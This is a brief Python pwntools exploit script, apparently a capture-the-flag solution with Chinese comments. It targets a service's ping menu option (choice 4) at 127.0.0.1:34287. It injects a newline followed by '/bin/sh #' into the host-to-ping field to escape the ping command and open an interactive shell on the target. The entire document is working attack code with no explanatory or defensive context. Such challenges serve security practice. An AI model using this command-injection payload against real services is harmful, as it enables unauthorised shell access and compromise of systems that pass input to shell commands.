from pwn import *

context(arch='amd64', os='linux')
#context.log_level = 'debug'

# 本地/远程切换
LOCAL = False
if LOCAL:
    p = process('./pwn')
else:
    p = remote('127.0.0.1', 34287)

def exploit():
    # 选择4号功能
    p.recvuntil(b"Your choice: ")
    p.sendline(b"4")
    
    # 构建命令注入Payload
    payload = b"\n/bin/sh #"
    
    # 发送Payload
    p.recvuntil(b"Enter host to ping: ")
    p.sendline(payload)
    
    # 获得交互式shell
    p.interactive()

if __name__ == '__main__':
    exploit()
